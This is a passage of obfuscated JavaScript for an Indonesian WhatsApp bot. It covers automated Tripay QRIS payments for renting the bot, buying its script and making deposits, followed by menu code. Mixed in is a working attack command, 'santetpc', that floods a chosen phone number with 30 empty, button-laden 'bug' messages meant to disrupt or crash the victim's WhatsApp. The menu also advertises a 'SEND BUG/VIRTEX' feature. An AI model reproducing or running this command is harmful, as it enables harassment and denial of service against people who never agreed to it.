_0x4c9484=['Cancel\x20Sewa','Confirmasi','315556MNRyUi','./database/sewa/','confirmsewa\x20','cancelsewa','_\x0a_》Fee\x20:\x20','UNPAID','.json','376302wGuUJw','EXPIRED','catch','success','144rLHgWG','_\x0a_》Total\x20:\x20','split','Kamu\x20Belum\x20Melakukan\x20Pembayaran','*──\x20「\x20PEMBAYARAN\x20BERHASIL\x20」\x20──*\x0a\x0a_Silahkan\x20Scan\x20Qris\x20Ini\x20Untuk\x20Membayar:_\x0a_》No\x20Ref\x20:\x20','_\x0a_》Method\x20:\x20Qris\x20Otomatis_\x0a_》Status\x20:\x20','_\x0a\x0aBot\x20Akan\x20Masuk\x20Group\x20Otomatis,\x20Mungkin\x20Membutuhkan\x20Waktu\x20Silahkan\x20Tunggu\x20Sebentar,\x20Terimakasih!.','amount','828380toehBq','4405yrXUVr','pembayar\x20kadaluarsa\x20','amount_received','name','Chat\x20Owner','2121980BrQfQq','groupAcceptInvite','sendButtonText','https://chat.whatsapp.com/','reference','unlinkSync','261495insQaY','get','PAID','2298wHpWNy','data','status','user','owner','Bearer\x20','409048rCWoTZ'];_0x53fb=function(){return _0x4c9484;};return _0x53fb();}axios[_0x1f9a33(0x1fe)]('https://tripay.co.id/api/transaction/detail?reference='+reference,{'headers':{'Authorization':_0x1f9a33(0x205)+apiKey},'validateStatus':function(_0x81187d){return _0x81187d<0x3e7;}})['then'](_0x464355=>{const _0x3d634b=_0x1f9a33;if(_0x464355[_0x3d634b(0x201)][_0x3d634b(0x213)]==!![]){if(_0x464355[_0x3d634b(0x201)][_0x3d634b(0x201)][_0x3d634b(0x202)]==_0x3d634b(0x20e)){let _0x524ba0=[{'buttonId':prefix+(_0x3d634b(0x20b)+_0x464355[_0x3d634b(0x201)][_0x3d634b(0x201)][_0x3d634b(0x1fb)]+'\x20'+q),'buttonText':{'displayText':_0x3d634b(0x208)},'type':0x1},{'buttonId':prefix+_0x3d634b(0x20c),'buttonText':{'displayText':_0x3d634b(0x207)},'type':0x1}];Manik[_0x3d634b(0x1f9)](from,_0x524ba0,_0x3d634b(0x217),Manik['user'][_0x3d634b(0x1f5)],m);}else{if(_0x464355['data']['data'][_0x3d634b(0x202)]==_0x3d634b(0x1ff)){brhsl=_0x3d634b(0x218)+_0x464355['data'][_0x3d634b(0x201)][_0x3d634b(0x1fb)]+'_\x0a_》Harga\x20:\x20'+formatmoney(_0x464355[_0x3d634b(0x201)][_0x3d634b(0x201)][_0x3d634b(0x1f4)])+_0x3d634b(0x20d)+formatmoney(_0x464355['data']['data']['total_fee'])+_0x3d634b(0x215)+formatmoney(_0x464355['data']['data'][_0x3d634b(0x1f0)])+_0x3d634b(0x219)+_0x464355['data'][_0x3d634b(0x201)][_0x3d634b(0x202)]+_0x3d634b(0x21a);let _0x41e515=[{'buttonId':prefix+_0x3d634b(0x204),'buttonText':{'displayText':_0x3d634b(0x1f6)},'type':0x1}];Manik['sendButtonText'](from,_0x41e515,brhsl,Manik[_0x3d634b(0x203)][_0x3d634b(0x1f5)],m);let _0x104b38=args[0x1][_0x3d634b(0x216)](_0x3d634b(0x1fa))[0x1];Manik[_0x3d634b(0x1f8)](_0x104b38)['then'](_0x457460=>reply(jsonformat(_0x457460)))[_0x3d634b(0x212)](_0x5848cb=>reply(jsonformat(_0x5848cb))),fs[_0x3d634b(0x1fc)](_0x3d634b(0x20a)+from+_0x3d634b(0x20f));}else _0x464355['data'][_0x3d634b(0x201)]['status']==_0x3d634b(0x211)&&(reply(_0x3d634b(0x1f3)),fs[_0x3d634b(0x1fc)]('./database/sewa/'+from+_0x3d634b(0x20f)));}}else reply(_0x464355[_0x3d634b(0x201)]['message']);})[_0x1f9a33(0x212)](_0x4d7119=>{reply(_0x4d7119);});
break
}
case prefix+'cancelsewa':
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(!fs.existsSync(`./database/sewa/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
fs.unlinkSync(`./database/sewa/${from}.json`)
        reply('Sukses')
        break
//BUY SC OTOMATIS BY MANIK
case prefix+'buysc':{ 
	if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
	if(fs.existsSync(`./database/buy/${from}.json`)) return reply(`Selesaikan pembelian anda sebelumnya`)
const axios = require('axios');
const crypto = require('crypto');

const merchant_ref = 'BUYSC' + randomNomor(1,999999)
const amount = 100000

const signature = crypto.createHmac('sha256', privateKey).update(merchant_code + merchant_ref + amount).digest('hex');

const _0x1b02b0=_0x44a5;function _0x13ab(){const _0x575171=['Bearer\x20','7LVQocN','message','./database/buy/','amount_received','4549086zqczEL','then','1060985BxxzAm','sender','stringify','https://wa.me/6283155997772','272041zoaivD','https://tripay.co.id/api/transaction/create','status','_\x0a\x0aJika\x20Anda\x20Sudah\x20Melakukan\x20Pembayaran\x20Silahkan\x20Klik\x20Tombol\x20Confirmasi\x20Dibawah\x20Dan\x20Sc\x20Akan\x20Dikirim\x20Secara\x20Otomatis\x20Tanpa\x20Acc\x20Owner!.','post','4905580UJLpXw','total_fee','_\x0a_》Total\x20:\x20','45OXTPEK','6lbtIao','chat','QRISC','data','8511016gompHW','_\x0a_》Fee\x20:\x20','reference','catch','1627588bzmsNN','writeFileSync','*──\x20「\x20CHECK\x20OUT\x20」\x20──*\x0a\x0a_Silahkan\x20Scan\x20Qris\x20Ini\x20Untuk\x20Membayar:_\x0a_》No\x20Ref\x20:\x20','DEPOSIT\x20BOT\x20','confirmbuy\x20','.json','983304NvhCqL','_\x0a_》Method\x20:\x20Qris\x20Otomatis_\x0a_》Status\x20:\x20'];_0x13ab=function(){return _0x575171;};return _0x13ab();}(function(_0x385c1f,_0x215625){const _0x5e4158=_0x44a5,_0x419931=_0x385c1f();while(!![]){try{const _0x2e17d8=parseInt(_0x5e4158(0x1bc))/0x1+parseInt(_0x5e4158(0x1d3))/0x2+parseInt(_0x5e4158(0x1c5))/0x3*(parseInt(_0x5e4158(0x1cd))/0x4)+-parseInt(_0x5e4158(0x1dc))/0x5+parseInt(_0x5e4158(0x1da))/0x6+-parseInt(_0x5e4158(0x1d6))/0x7*(-parseInt(_0x5e4158(0x1c9))/0x8)+-parseInt(_0x5e4158(0x1c4))/0x9*(parseInt(_0x5e4158(0x1c1))/0xa);if(_0x2e17d8===_0x215625)break;else _0x419931['push'](_0x419931['shift']());}catch(_0x245648){_0x419931['push'](_0x419931['shift']());}}}(_0x13ab,0xb355e));const data={'method':_0x1b02b0(0x1c7),'merchant_ref':merchant_ref,'amount':amount,'customer_name':'AryaBot','customer_email':'aryamanik104@gmail.com','order_items':[{'name':_0x1b02b0(0x1d0)+amount,'price':amount,'quantity':0x1}],'return_url':_0x1b02b0(0x1bb),'signature':signature};function _0x44a5(_0x2811bd,_0x5d96d9){const _0x13ab91=_0x13ab();return _0x44a5=function(_0x44a5e6,_0x352275){_0x44a5e6=_0x44a5e6-0x1bb;let _0x3d6438=_0x13ab91[_0x44a5e6];return _0x3d6438;},_0x44a5(_0x2811bd,_0x5d96d9);}axios[_0x1b02b0(0x1c0)](_0x1b02b0(0x1bd),data,{'headers':{'Authorization':_0x1b02b0(0x1d5)+apiKey},'validateStatus':function(_0x51d002){return _0x51d002<0x3e7;}})[_0x1b02b0(0x1db)](_0xeb4ab3=>{const _0x23a43b=_0x1b02b0;let _0x1e99bf=[{'quickReplyButton':{'displayText':'📜\x20Confirmasi','id':prefix+_0x23a43b(0x1d1)+_0xeb4ab3['data'][_0x23a43b(0x1c8)][_0x23a43b(0x1cb)]}}];messn=_0x23a43b(0x1cf)+_0xeb4ab3[_0x23a43b(0x1c8)][_0x23a43b(0x1c8)]['reference']+'_\x0a_》Harga\x20:\x20'+formatmoney(_0xeb4ab3['data'][_0x23a43b(0x1c8)][_0x23a43b(0x1d9)])+_0x23a43b(0x1ca)+formatmoney(_0xeb4ab3[_0x23a43b(0x1c8)]['data'][_0x23a43b(0x1c2)])+_0x23a43b(0x1c3)+formatmoney(_0xeb4ab3['data'][_0x23a43b(0x1c8)]['amount'])+_0x23a43b(0x1d4)+_0xeb4ab3[_0x23a43b(0x1c8)]['data'][_0x23a43b(0x1be)]+_0x23a43b(0x1bf),Manik['sendMessage'](m[_0x23a43b(0x1c6)],{'caption':messn,'image':{'url':_0xeb4ab3[_0x23a43b(0x1c8)][_0x23a43b(0x1c8)]['qr_url']},'templateButtons':_0x1e99bf,'footer':'ManikBot\x20By\x20Own-Manik√','mentions':[m[_0x23a43b(0x1dd)]]});let _0x49c59e={'id':sender,'ref':_0xeb4ab3[_0x23a43b(0x1c8)][_0x23a43b(0x1c8)][_0x23a43b(0x1cb)],'status':_0xeb4ab3[_0x23a43b(0x1c8)][_0x23a43b(0x1c8)]['status']};fs[_0x23a43b(0x1ce)](_0x23a43b(0x1d8)+from+_0x23a43b(0x1d2),JSON[_0x23a43b(0x1de)](_0x49c59e));})[_0x1b02b0(0x1cc)](_0x3dedd4=>{const _0x2f74ac=_0x1b02b0;reply(_0x3dedd4[_0x2f74ac(0x1c8)][_0x2f74ac(0x1d7)]);});
break
}

case prefix+'confirmbuy':{
	if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
	if(!fs.existsSync(`./database/buy/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
const axios = require('axios');
const deppo = JSON.parse(fs.readFileSync(`./database/buy/${from}.json`))
const _0x5a24de=_0x3681;function _0x3681(_0x56001a,_0x3acb76){const _0x347b4f=_0x347b();return _0x3681=function(_0x3681d1,_0x377a3f){_0x3681d1=_0x3681d1-0x1b7;let _0x47b303=_0x347b4f[_0x3681d1];return _0x47b303;},_0x3681(_0x56001a,_0x3acb76);}(function(_0x4aa185,_0x482de3){const _0x455f08=_0x3681,_0xbe82e7=_0x4aa185();while(!![]){try{const _0x13bd6c=parseInt(_0x455f08(0x1bb))/0x1+-parseInt(_0x455f08(0x1d4))/0x2*(-parseInt(_0x455f08(0x1d9))/0x3)+parseInt(_0x455f08(0x1c0))/0x4+-parseInt(_0x455f08(0x1b9))/0x5+parseInt(_0x455f08(0x1c2))/0x6*(parseInt(_0x455f08(0x1cd))/0x7)+parseInt(_0x455f08(0x1c4))/0x8+-parseInt(_0x455f08(0x1bd))/0x9;if(_0x13bd6c===_0x482de3)break;else _0xbe82e7['push'](_0xbe82e7['shift']());}catch(_0x5e306b){_0xbe82e7['push'](_0xbe82e7['shift']());}}}(_0x347b,0xe35d6));var reference=''+(checkRefBuy(sender,deppo)?checkRefBuy(sender,deppo):q);function _0x347b(){const _0x257bce=['_\x0a_》Fee\x20:\x20','name','2516980ANSBVC','UNPAID','6PqGxVc','_\x0a_》Harga\x20:\x20','5920048AcAWge','user','success','sendButtonText','EXPIRED','total_fee','then','Kamu\x20Belum\x20Melakukan\x20Pembayaran','*──\x20「\x20PEMBAYARAN\x20BERHASIL\x20」\x20──*\x0a\x0a_Silahkan\x20Scan\x20Qris\x20Ini\x20Untuk\x20Membayar:_\x0a_》No\x20Ref\x20:\x20','63021MTNuVK','_\x0a_》Total\x20:\x20','PAID','confirmbuy\x20','owner','reference','Bearer\x20','2710276IsiaYb','unlinkSync','Chat\x20Owner','Cancel\x20Buy','.json','3DfGgRN','status','message','data','1616825eQXbJV','catch','349265DCpHdJ','cancelbuy','16452054EzLNdt'];_0x347b=function(){return _0x257bce;};return _0x347b();}axios['get']('https://tripay.co.id/api/transaction/detail?reference='+reference,{'headers':{'Authorization':_0x5a24de(0x1d3)+apiKey},'validateStatus':function(_0x3cee17){return _0x3cee17<0x3e7;}})[_0x5a24de(0x1ca)](_0xcf9e2d=>{const _0xa0804=_0x5a24de;if(_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1c6)]==!![]){if(_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)][_0xa0804(0x1da)]==_0xa0804(0x1c1)){let _0x2166fe=[{'buttonId':prefix+(_0xa0804(0x1d0)+_0xcf9e2d['data'][_0xa0804(0x1b8)][_0xa0804(0x1d2)]),'buttonText':{'displayText':'Confirmasi'},'type':0x1},{'buttonId':prefix+_0xa0804(0x1bc),'buttonText':{'displayText':_0xa0804(0x1d7)},'type':0x1}];Manik['sendButtonText'](from,_0x2166fe,_0xa0804(0x1cb),Manik[_0xa0804(0x1c5)][_0xa0804(0x1bf)],m);}else{if(_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)]['status']==_0xa0804(0x1cf)){brhsl=_0xa0804(0x1cc)+_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)][_0xa0804(0x1d2)]+_0xa0804(0x1c3)+formatmoney(_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)]['amount_received'])+_0xa0804(0x1be)+formatmoney(_0xcf9e2d['data'][_0xa0804(0x1b8)][_0xa0804(0x1c9)])+_0xa0804(0x1ce)+formatmoney(_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)]['amount'])+'_\x0a_》Method\x20:\x20Qris\x20Otomatis_\x0a_》Status\x20:\x20'+_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)]['status']+'_\x0a\x0aScript\x20Akan\x20Dikirim,\x20Mungkin\x20Membutuhkan\x20Waktu\x20Silahkan\x20Tunggu\x20Sebentar,\x20Terimakasih!.';let _0x28d5ce=[{'buttonId':prefix+_0xa0804(0x1d1),'buttonText':{'displayText':_0xa0804(0x1d6)},'type':0x1}];Manik[_0xa0804(0x1c7)](from,_0x28d5ce,brhsl,Manik['user'][_0xa0804(0x1bf)],m),fs['unlinkSync']('./database/buy/'+from+_0xa0804(0x1d8));}else _0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b8)][_0xa0804(0x1da)]==_0xa0804(0x1c8)&&(reply('pembayar\x20kadaluarsa\x20'),fs[_0xa0804(0x1d5)]('./database/buy/'+from+_0xa0804(0x1d8)));}}else reply(_0xcf9e2d[_0xa0804(0x1b8)][_0xa0804(0x1b7)]);})[_0x5a24de(0x1ba)](_0x51405a=>{reply(_0x51405a);});
break
}
case prefix+'cancelbuy':
if (isGroup) return reply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(!fs.existsSync(`./database/buy/${from}.json`)) return reply('Kamu tidak melakukan pembelian')
fs.unlinkSync(`./database/buy/${from}.json`)
        reply('Sukses')
        break
//CASE DEPOSIT OTOMATIS BY MANIK
case prefix+'depo':{ 
	if(fs.existsSync(`./database/depo/${from}.json`)) return reply(`Selesaikan Deposit anda sebelumnya`)
	if (q == 'undefined') return ('deposit brpa?')
	if (q < 1000) return reply('Minimal Rp1.000')
	if (q > 5000000) return reply('Maksimal Rp5.000.000')
const axios = require('axios');
const crypto = require('crypto');

const merchant_ref = 'DEPO' + randomNomor(1,999999)
const amount = q

const signature = crypto.createHmac('sha256', privateKey).update(merchant_code + merchant_ref + amount).digest('hex');

function _0x300a(){const _0x4f7efb=['616JpRhPj','6fvJwFT','2317vuRJXF','post','324988BlcJCu','_\x0a_》Total\x20:\x20','message','status','DEPOSIT\x20BOT\x20','./database/depo/','_\x0a_》Fee\x20:\x20','*──\x20「\x20CHECK\x20DEPOSIT\x20」\x20──*\x0a\x0a_Silahkan\x20Cek\x20Data\x20Berikut\x20Ini:_\x0a_》No\x20Ref\x20:\x20','sendMessage','61035dAppIv','5997940Pxtfus','https://tripay.co.id/api/transaction/create','https://wa.me/6283155997772','75088jzhNeh','sender','769215MKJCDr','_\x0a\x0aJika\x20Data\x20Sudah\x20Benar\x20Silahkan\x20Klik\x20Scan\x20Qris\x20Dan\x20Lakukan\x20Pembayaran\x20Sesuai\x20Nominal,\x20Jika\x20Sudah\x20Melakukan\x20Pembayaran\x20Silahkan\x20Klik\x20Tombol\x20Confirmasi\x20Dibawah\x20Dan\x20Saldo\x20Akan\x20Otomatis\x20Masuk\x20Pada\x20Akun\x20Anda!.','confirmdp\x20','amount_received','chat','stringify','data','AryaBot','writeFileSync','1373931DTApJM','.json','reference','📜\x20Confirmasi','QRISC','4HIRECl','ManikBot\x20By\x20Own-Manik√'];_0x300a=function(){return _0x4f7efb;};return _0x300a();}const _0x51385c=_0x24a9;(function(_0x33e748,_0x408a06){const _0x29b818=_0x24a9,_0x3528bb=_0x33e748();while(!![]){try{const _0xdfee36=-parseInt(_0x29b818(0x1db))/0x1+-parseInt(_0x29b818(0x1f1))/0x2+parseInt(_0x29b818(0x1d7))/0x3*(parseInt(_0x29b818(0x1eb))/0x4)+parseInt(_0x29b818(0x1dd))/0x5*(-parseInt(_0x29b818(0x1ee))/0x6)+parseInt(_0x29b818(0x1ef))/0x7*(parseInt(_0x29b818(0x1ed))/0x8)+-parseInt(_0x29b818(0x1e6))/0x9+parseInt(_0x29b818(0x1d8))/0xa;if(_0xdfee36===_0x408a06)break;else _0x3528bb['push'](_0x3528bb['shift']());}catch(_0x4b43ad){_0x3528bb['push'](_0x3528bb['shift']());}}}(_0x300a,0x18ca6));const data={'method':_0x51385c(0x1ea),'merchant_ref':merchant_ref,'amount':amount,'customer_name':_0x51385c(0x1e4),'customer_email':'aryamanik104@gmail.com','order_items':[{'name':_0x51385c(0x1d2)+amount,'price':amount,'quantity':0x1}],'return_url':_0x51385c(0x1da),'signature':signature};function _0x24a9(_0x39dd38,_0x205a12){const _0x300a76=_0x300a();return _0x24a9=function(_0x24a9c1,_0x578454){_0x24a9c1=_0x24a9c1-0x1cf;let _0x3e284a=_0x300a76[_0x24a9c1];return _0x3e284a;},_0x24a9(_0x39dd38,_0x205a12);}axios[_0x51385c(0x1f0)](_0x51385c(0x1d9),data,{'headers':{'Authorization':'Bearer\x20'+apiKey},'validateStatus':function(_0x10b816){return _0x10b816<0x3e7;}})['then'](_0x1316e5=>{const _0x397213=_0x51385c;let _0xe3af26=[{'quickReplyButton':{'displayText':_0x397213(0x1e9),'id':prefix+_0x397213(0x1df)+_0x1316e5[_0x397213(0x1e3)][_0x397213(0x1e3)]['reference']}}];messn=_0x397213(0x1d5)+_0x1316e5['data'][_0x397213(0x1e3)][_0x397213(0x1e8)]+'_\x0a_》Diterima\x20:\x20'+formatmoney(_0x1316e5[_0x397213(0x1e3)][_0x397213(0x1e3)][_0x397213(0x1e0)])+_0x397213(0x1d4)+formatmoney(_0x1316e5[_0x397213(0x1e3)][_0x397213(0x1e3)]['total_fee'])+_0x397213(0x1cf)+formatmoney(_0x1316e5[_0x397213(0x1e3)][_0x397213(0x1e3)]['amount'])+'_\x0a_》Method\x20:\x20Qris\x20Otomatis_\x0a_》Status\x20:\x20'+_0x1316e5['data'][_0x397213(0x1e3)][_0x397213(0x1d1)]+_0x397213(0x1de),Manik[_0x397213(0x1d6)](m[_0x397213(0x1e1)],{'caption':messn,'image':{'url':_0x1316e5[_0x397213(0x1e3)][_0x397213(0x1e3)]['qr_url']},'templateButtons':_0xe3af26,'footer':_0x397213(0x1ec),'mentions':[m[_0x397213(0x1dc)]]});let _0x3d4ca6={'id':sender,'ref':_0x1316e5[_0x397213(0x1e3)][_0x397213(0x1e3)][_0x397213(0x1e8)],'status':_0x1316e5['data'][_0x397213(0x1e3)]['status']};fs[_0x397213(0x1e5)](_0x397213(0x1d3)+from+_0x397213(0x1e7),JSON[_0x397213(0x1e2)](_0x3d4ca6));})['catch'](_0x3d8856=>{const _0x55164f=_0x51385c;reply(_0x3d8856[_0x55164f(0x1e3)][_0x55164f(0x1d0)]);});
break
}
case prefix+'canceldp':
if(!fs.existsSync(`./database/depo/${from}.json`)) return reply('Kamu tidak melakukan deposit')
fs.unlinkSync(`./database/depo/${from}.json`)
        reply('Sukses')
        break
case prefix+'confirmdp':{
	if(!fs.existsSync(`./database/depo/${from}.json`)) return reply('Kamu tidak melakukan deposit')
const axios = require('axios');
const deppo = JSON.parse(fs.readFileSync(`./database/depo/${from}.json`))
const _0x465304=_0x19ab;(function(_0x11e615,_0x49a9cd){const _0x482aa0=_0x19ab,_0x5676a5=_0x11e615();while(!![]){try{const _0x4ab410=-parseInt(_0x482aa0(0x83))/0x1*(-parseInt(_0x482aa0(0xa1))/0x2)+parseInt(_0x482aa0(0x8a))/0x3+parseInt(_0x482aa0(0x96))/0x4*(-parseInt(_0x482aa0(0xaa))/0x5)+parseInt(_0x482aa0(0x88))/0x6*(-parseInt(_0x482aa0(0xa5))/0x7)+-parseInt(_0x482aa0(0xab))/0x8+-parseInt(_0x482aa0(0x85))/0x9+parseInt(_0x482aa0(0xa4))/0xa;if(_0x4ab410===_0x49a9cd)break;else _0x5676a5['push'](_0x5676a5['shift']());}catch(_0x118da5){_0x5676a5['push'](_0x5676a5['shift']());}}}(_0x5933,0xc2996));function _0x5933(){const _0x1c6367=['status','Confirmasi','EXPIRED','PAID','4cCwnSh','name','_\x0a_》Fee\x20:\x20','Your\x20Deposit','canceldp','./database/depo/','confirmdp\x20','Cancel\x20Depo','amount','user','reference','1882620fwSDuA','then','*──\x20「\x20DEPOSIT\x20BERHASIL\x20」\x20──*\x0a\x0a_Silahkan\x20Cek\x20Data\x20Berikut\x20Ini:_\x0a_》No\x20Ref\x20:\x20','30366510UxgNLX','31927mskTXk','catch','_\x0a_》Total\x20:\x20','Kamu\x20Belum\x20Melakukan\x20Pembayaran','data','624785GQDKVU','10070408taoWrn','success','pembayar\x20kadaluarsa\x20','1XPNQkV','get','8202978apNPzW','unlinkSync','sendButtonText','1476NifsGR','https://tripay.co.id/api/transaction/detail?reference=','708969LbHtkc','_\x0a_》Diterima\x20:\x20','UNPAID','Bearer\x20','total_fee','_\x0a_》Method\x20:\x20Qris\x20Otomatis_\x0a_》Status\x20:\x20','amount_received','.json'];_0x5933=function(){return _0x1c6367;};return _0x5933();}function _0x19ab(_0x18c32b,_0x178a21){const _0x593300=_0x5933();return _0x19ab=function(_0x19aba2,_0x35806c){_0x19aba2=_0x19aba2-0x83;let _0x121ee3=_0x593300[_0x19aba2];return _0x121ee3;},_0x19ab(_0x18c32b,_0x178a21);}var reference=''+(checkRefDepo(sender,deppo)?checkRefDepo(sender,deppo):q);axios[_0x465304(0x84)](_0x465304(0x89)+reference,{'headers':{'Authorization':_0x465304(0x8d)+apiKey},'validateStatus':function(_0x359123){return _0x359123<0x3e7;}})[_0x465304(0xa2)](_0x7b7b67=>{const _0x2d3dd7=_0x465304;if(_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xac)]==!![]){if(_0x7b7b67['data'][_0x2d3dd7(0xa9)]['status']==_0x2d3dd7(0x8c)){let _0xecb675=[{'buttonId':prefix+(_0x2d3dd7(0x9c)+_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)][_0x2d3dd7(0xa0)]),'buttonText':{'displayText':_0x2d3dd7(0x93)},'type':0x1},{'buttonId':prefix+_0x2d3dd7(0x9a),'buttonText':{'displayText':_0x2d3dd7(0x9d)},'type':0x1}];Manik['sendButtonText'](from,_0xecb675,_0x2d3dd7(0xa8),Manik[_0x2d3dd7(0x9f)]['name'],m);}else{if(_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)]['status']==_0x2d3dd7(0x95)){brhsl=_0x2d3dd7(0xa3)+_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)]['reference']+_0x2d3dd7(0x8b)+formatmoney(_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)][_0x2d3dd7(0x90)])+_0x2d3dd7(0x98)+formatmoney(_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)][_0x2d3dd7(0x8e)])+_0x2d3dd7(0xa7)+formatmoney(_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)][_0x2d3dd7(0x9e)])+_0x2d3dd7(0x8f)+_0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)]['status']+'_\x0a\x0aNote:\x20Saldo\x20Telah\x20Masuk\x20Otomatis\x20ke\x20Akun\x20Anda\x20Silahkan\x20Cek\x20Dengan\x20'+prefix+'mydepo';let _0x4a922c=[{'buttonId':prefix+'mydepo','buttonText':{'displayText':_0x2d3dd7(0x99)},'type':0x1}];Manik[_0x2d3dd7(0x87)](from,_0x4a922c,brhsl,Manik[_0x2d3dd7(0x9f)][_0x2d3dd7(0x97)],m),depn=_0x7b7b67['data'][_0x2d3dd7(0xa9)][_0x2d3dd7(0x90)],addMonUser(sender,depn),fs[_0x2d3dd7(0x86)](_0x2d3dd7(0x9b)+from+_0x2d3dd7(0x91));}else _0x7b7b67[_0x2d3dd7(0xa9)][_0x2d3dd7(0xa9)][_0x2d3dd7(0x92)]==_0x2d3dd7(0x94)&&(reply(_0x2d3dd7(0xad)),fs[_0x2d3dd7(0x86)](_0x2d3dd7(0x9b)+from+_0x2d3dd7(0x91)));}}else reply(_0x7b7b67['data']['message']);})[_0x465304(0xa6)](_0x274194=>{reply(_0x274194);});
break
}
case prefix+'giff':{
	let randh = getRandom('.mp4')
         let out = `./media/gif/${randh}`
	exec(`ffmpeg -y -f image2 -framerate 1 -i './media/gif/i%d.jpg' ${out}`)
   //exec(`ffmpeg -y -f image2 -framerate 1 -i './media/gif/i%d.jpg' -vf scale=2064x1376 ${out}`)
   reply(out)
   setTimeout(() => { Manik.sendMessage(m.chat, { video: { url: `${out}`, caption: 'Nah hasilnya' }}, { quoted: m })}, 10000)
         await sleep(3000)//turu
	break
}
//END DEPOSIT OTOMATIS BY MANIK

//SANTETPC
case prefix+'santetpc': {
//if (!isManik) return reply(mess.owner)
if (!isPremium) return reply(`Khusus member Premium, Hubungi Owner`)
if (!q) return reply(`Contoh ${command} 6281297970769`)
tosend = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
//if (Input == creator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
let kgdhwus = await Manik.onWhatsApp(tosend)
if (kgdhwus.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
jumlah = '30'
for (let i = 0; i < jumlah; i++) {
await Manik.sendMessage(tosend, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
await reply(`Sukses Mengirim *SANTETPC* ke *${tosend}*\n\n`)
await sendText(creator, `*${sender}* Telah mengirim *santet pc* ke ${tosend}`, 0)	
await sleep(1000)
}
break
}

//FIX BY YUDHA

//MENU FIX
case prefix+'menu':{
	try {
	ppuser = await Manik.profilePictureUrl(m.chat, 'image')
         } catch {
			 ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         } 
		

	
let cute = 'https://wallpaperaccess.com/full/21963.jpg'
let caption = `Hi Kak, ${pushname !== undefined ? pushname : 'Kak'}\n\nYUDHA BOT, Bot WhatsApp Yang Membantu Kamu Untuk Mempermudah Sesuatu Seperti Membuat Sticker Dan Lainnya, Ada Butuh Info Dariku?`

await Manik.send2ButtonLoc(m.chat, await reSize(ppuser, 300, 200), caption, 'Jangan Pernah\nVC/Call ke Nomor BOT atau Auto Block !', '🔎 COMMAND', '.simplemenu', '🛒 ITEM', '.item', m)

break

}

//SIMPLE Menu
case prefix+'simplemenu':{
	
	try {
	ppuser = await Manik.profilePictureUrl(m.chat, 'image')
         } catch {
			 ppuser = 'https://telegra.ph/file/265c672094dfa87caea19.jpg'
         }
	
	let itil = `\`\`\`${ucapanWaktu} Kak ${pushname !== undefined ? pushname : 'Kak'}\`\`\` 
    
_Berhenti terus mengingat masa lalu, terutama hal buruk yg telah terjadi. Fokuslah hari ini tuk masa depan yg lebih baik_
  
*╭── 「 INFORMASI USER 」 ──*
*│*   
*│❒͡  Nama: ${pushname !== undefined ? pushname : 'Kak'}*
*│❒͡  Bio: -*
*│❒͡  Status: ${isManik ? 'Owner' : isPremium ? 'Premium' : 'Gratisan'}*
*│❒͡  Limit Harian: ${isManik ? '∞' : isPremium ? '∞' : global.db.users[m.sender].limit}*
*│❒͡  Limit Game: ${cekGLimit(sender, gcount, glimit)}*
*│❒͡  Api: wa.me/${m.sender.split('@')[0]}*
*│❒͡  wa.me/6283155997772*
*│❒͡  Tanggal: ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}*  
*│❒͡  Waktu: ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB*
*│❒͡  Saldo : -*
*│* 
*╰── 「 YUDHA BOT 」 ──*

Catatan:   
Perlakukan Bot Secara Baik, Owner Akan Bertindak Tegas Apabila Pengguna Melanggar Rules. 
Bot Ini Terdapat Anti Spam Yang Berupa Auto Banned jika terdeteksi SPAM. 

*Official BOT By KangYud*`
	
	const buttons = [
  {buttonId: '.sewa2', buttonText: {displayText: 'SEWA'}, type: 1}
]

const buttonMessage = {
    image: {url: ppuser},
    caption: itil,
    footer: ' ',
    buttons: buttons,
    headerType: 4
}

const sections = [
   {
	title: "New Fitur",
	rows: [
	    {title: "「 🛒 」 STORE", rowId: ".item", description: "Melihat Produk Dari Grup"},
	    {title: "「 🤥 」 RIPPER/FRAUD CEK", rowId: ".menuriper", description: "Comming Son"},
	    {title: "「 💱 」 REKBER", rowId: ".menurekber", description: "Comming Son"},
	    {title: "「 🦠 」 SEND BUG/VIRTEX", rowId: ".sendbug", description: "Melihat Command untuk Store"},
	]
    },{
	title: "Kategori Command",
	rows: [
	    {title: "「 🏘️ 」 ADMIN GROUP", rowId: ".admin", description: "Melihat Command untuk Admin Group"},
	    {title: "「 🏘️ 」 GROUP", rowId: ".menugroup", description: "Melihat Command untuk Group"},
